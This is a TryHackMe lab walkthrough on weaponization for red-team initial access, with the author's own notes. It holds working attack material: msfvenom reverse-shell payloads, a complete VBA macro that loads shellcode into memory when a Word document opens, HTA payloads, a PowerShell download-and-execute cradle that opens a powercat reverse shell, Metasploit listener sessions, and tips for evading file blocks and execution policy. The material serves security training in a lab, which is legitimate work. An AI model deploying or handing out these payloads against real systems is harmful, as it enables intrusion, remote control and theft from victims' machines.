---
Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.
---

![](https://assets.tryhackme.com/room-banners/initial-access.png)

###  Introduction 

In this room, we will be discussing different techniques used for weaponization. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c2b48bf0b212e640b259a3405c2391b1.png)

What is Weaponization

Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html). The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.

Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing .exe files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.

The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)

For more information about red team toolkits, please visit the following: a [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development) that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:

    The Windows Script Host (WSH)
    An HTML Application (HTA)
    Visual Basic Applications (VBA)
    PowerShell (PSH)


Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
*No answer needed*

### Deploy the Windows Machine 

In order to follow up along with the task content and apply what is given in this room, you need to start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up. To access the attached machine, you can either use the split in browser view or connect through the RDP.

If you prefer to connect through the Remote Desktop Protocol (RDP), first make sure you are connected to the VPN. Then an RDP client is required to connect to the attached Windows 10 machine. You can connect using the xfreerdp tool, which is available on the TryHackMe AttackBox.

To connect  via xfreerdp use the following command:

```Terminal           
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
```

The username: thm  and the password: TryHackM3 
Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task.
*No answer needed*

### Windows Scripting Host - WSH 

Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript).

It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

```
Dim message 
message = "Welcome to THM"
MsgBox message
```

In the first line, we declared the message variable using Dim. Then we store a string value of Welcome to THM in the message variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit here. Then, we use wscript to run and execute the content of hello.vbs. As a result, A Windows message will pop up with the Welcome to THM message.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)

Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).

	Set shell = WScript.CreateObject("Wscript.Shell")
	shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True

We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe. 

To execute the exe file, we can run it using the wscript as follows, 

```
Terminal

           
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
 
```

We can also run it via cscript as follows,

```
Terminal

           
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs


```

As a result, the Windows calculator will appear on the Desktop.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)

Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,

```
Terminal

           
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 
```

The result will be as exact as executing the vbs files, which run the calc.exe binary.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)


Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.
*No answer needed*

![[Pasted image 20220909223152.png]]

![[Pasted image 20220909225052.png]]

![[Pasted image 20220909225445.png]]

![[Pasted image 20220909225616.png]]


### An HTML Application - HTA 

An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,

```
Terminal

           
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)


```

![[Pasted image 20220909230849.png]]

On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)

Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)

HTA Reverse Connection

We can create a reverse shell payload as follows,

```
Terminal

           
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta


```

We use the msfvenom from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the windows/x64/shell_reverse_tcp to our IP and listening port.

On the attacking machine, we need to listen to the port 443 using nc. Please note this port needs root privileges to open, or you can use different ones.

Once the victim visits the malicious URL and hits run, we get the connection back.

```
Terminal

           
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1


```

![[Pasted image 20220909231314.png]]

Malicious HTA via Metasploit 

There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using msfconsole -q command. Under the exploit section, there is exploit/windows/misc/hta_server, which requires selecting and setting information such as LHOST, LPORT, SRVHOST, Payload, and finally, executing exploit to run the module.

```
Terminal

           
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.


```

On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.

```
Terminal

           
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>


```


Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
*No answer needed*

### Visual Basic for Application - VBA 

Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. 

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API)) and other low-level functionality. For more information about VBA, visit [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications). 

In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.

Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)

Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)

Now create a new blank Microsoft document to create our first macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting view → macros. The Macros window shows to create our own macro within the document.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)

In the Macro name section, we choose to name our macro as THM. Note that we need to select from the Macros in list Document1 and finally select create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message: Welcome to Weaponization Room!. We can do that using the MsgBox function as follows:

```
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Finally, run the macro by F5 or Run → Run Sub/UserForm.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the THM function.

```
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

![[Pasted image 20220909232322.png]]

![[Pasted image 20220909232339.png]]

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)

Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)


![[Pasted image 20220909233719.png]]

Once we allowed the Enable Content, our macro gets executed as shown,
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)

Now edit the word document and create a macro function that executes a calc.exe or any executable file as proof of concept as follows,

```
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

To explain the code in detail, with Dim payload As String, we declare payload variable as a string using Dim keyword. With payload = "calc.exe" we are specifying the payload name and finally with CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  AutoOpen() and Document_open() functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.

![[Pasted image 20220909234315.png]]

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.



Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.

```
Terminal

           
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes


```

The value of the LHOST in the above terminal is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.

Import to note that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the Workbook_Open() to Document_Open() to make it suitable for MS word documents.

Now copy the output and save it into the macro editor of the MS word document, as we showed previously.

From the attacking machine, run the Metasploit framework and set the listener as follows:

```
Terminal

           
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 


```

Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.

```
Terminal

           
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >


```

Now replicate and apply what we discussed to get a reverse shell!
*No answer needed*

```msfvenom
#If Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Pnxbios As Long, ByVal Jgwqn As Long, ByVal Ghjuwpvp As LongPtr, Pjvtpjeot As Long, ByVal Jkqd As Long, Vvqxuu As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Djqn As Long, ByVal Qabxqzq As Long, ByVal Dvzi As Long, ByVal Uylf As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Igtlyg As LongPtr, ByRef Vzxk As Any, ByVal Uwrz As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Pnxbios As Long, ByVal Jgwqn As Long, ByVal Ghjuwpvp As Long, Pjvtpjeot As Long, ByVal Jkqd As Long, Vvqxuu As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Djqn As Long, ByVal Qabxqzq As Long, ByVal Dvzi As Long, ByVal Uylf As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Igtlyg As Long, ByRef Vzxk As Any, ByVal Uwrz As Long) As Long
#EndIf

Sub Auto_Open()
        Dim Osxkuqc As Long, Jstvnd As Variant, Fwdky As Long
#If Vba7 Then
        Dim  Vhnl As LongPtr, Wydbwiu As LongPtr
#Else
        Dim  Vhnl As Long, Wydbwiu As Long
#EndIf
        Jstvnd = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,15,183,74,38,139,114,40,49,255,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,139,72,24,80,139,88,32,1,211,133,201,116,60,73,139, _
52,139,49,255,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,51,50,0,0,104,119,115,50,95,84, _
104,76,119,38,7,137,232,255,208,184,144,1,0,0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,10,11,81,220,104,2,0,1,187,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0, _
106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213, _
94,94,255,12,36,15,133,112,255,255,255,233,155,255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)

        Vhnl = VirtualAlloc(0, UBound(Jstvnd), &H1000, &H40)
        For Fwdky = LBound(Jstvnd) To UBound(Jstvnd)
                Osxkuqc = Jstvnd(Fwdky)
                Wydbwiu = RtlMoveMemory(Vhnl + Fwdky, Osxkuqc, 1)
        Next Fwdky
        Wydbwiu = CreateThread(0, 0, Vhnl, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open() 
        Auto_Open
End Sub



```

change Workbook_Open to (Document_Open ), with netcat works but for a little of time, with metasploit it's better.
![[Pasted image 20220909235947.png]]



### PowerShell - PSH 

PowerShell (PSH)

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, [Hacking with PowerShell](https://tryhackme.com/room/powershell) for more information about PowerShell.

Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,

```
Write-Output "Welcome to the Weaponization Room!"
```

Save the file as thm.ps1. With the Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt. Now let's run it and see the result.

```CMD

           
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>


```

Execution Policy

PowerShell's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.

You can determine the current PowerShell setting of your Windows as follows,

```CMD

           
PS C:\Users\thm> Get-ExecutionPolicy
Restricted


```

We can also easily change the PowerShell execution policy by running:

```CMD
      
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

Bypass Execution Policy

Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.

In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, 

```CMD

           
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!


```

Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.

```Terminal

           
			
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.

```

Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080.

```Terminal

           
			
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 


```

On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.

```Terminal
		
user@machine$ nc -lvp 1337

```

Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,

```Terminal
	
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"

```

Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337. After a couple of seconds, we should receive the connection call back:

```Terminal
		
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
    
```

Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 
*No answer needed*

![[Pasted image 20220910105545.png]]

![[Pasted image 20220910105733.png]]

```
──(kali㉿kali)-[~]
└─$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 626.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
                                                                          
┌──(kali㉿kali)-[~]
└─$ ls
armitage-tmp  Downloads     multi_launcher  powercat     Templates
book.txt      ftp_flag.txt  Music           Public       thm.hta
Desktop       hashctf2      payload.hta     stager2.bat  Videos
Documents     launcher.bat  Pictures        Sublist3r
                                                                          
┌──(kali㉿kali)-[~]
└─$ cd powercat 
                                                                          
┌──(kali㉿kali)-[~/powercat]
└─$ ls
powercat.ps1  README.md
                                                                          
┌──(kali㉿kali)-[~/powercat]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.129.90 - - [10/Sep/2022 11:58:49] "GET /powercat.ps1 HTTP/1.1" 200 -
```


![[Pasted image 20220910105938.png]]

![[Pasted image 20220910110106.png]]



### Command And Control - (C2 Or C&C) 

This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg)

What is Command and Control (C2)?

C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to:

    Generate various malicious payloads
    Enumerate the compromised machine/networks
    Perform privilege escalation and pivoting
    Lateral movement 
    And many others


Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.


Cobalt Strike

Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.

PowerShell Empire

PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire.

Metasploit 

Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest trying out the following two rooms: Metasploit: Introduction and Metasploit.

Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room.

###  Delivery Techniques 

Delivery Techniques

Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5ca83fe7cfa5020a7bcb950ef90c8ec.png)

Email Delivery

It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit [here](https://attack.mitre.org/techniques/T1566/001/). This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.

The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.

The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.

Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1a0948c69efa832d68512b03357a7cbc.png)

Web Delivery

Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit [here](https://attack.mitre.org/techniques/T1189/).

This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.

In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d374b6e862a19fb8be2a723f3e20884f.jpg)

USB Delivery

This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about the USB delivery, visit [here](https://attack.mitre.org/techniques/T1091/).

Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.

Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable.




Which method is used to distribute payloads to a victim at social events?
*USB Delivery*

### Practice Arena 

We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://10.10.129.90:8080/.

Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d92b185b39570d4740e6f6a8e905124a.png)

The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.

Note for Doc files: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. 

In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,

![[Pasted image 20220910113426.png]]
![[Pasted image 20220910113437.png]]

```
Terminal

           
meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960


```

In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.

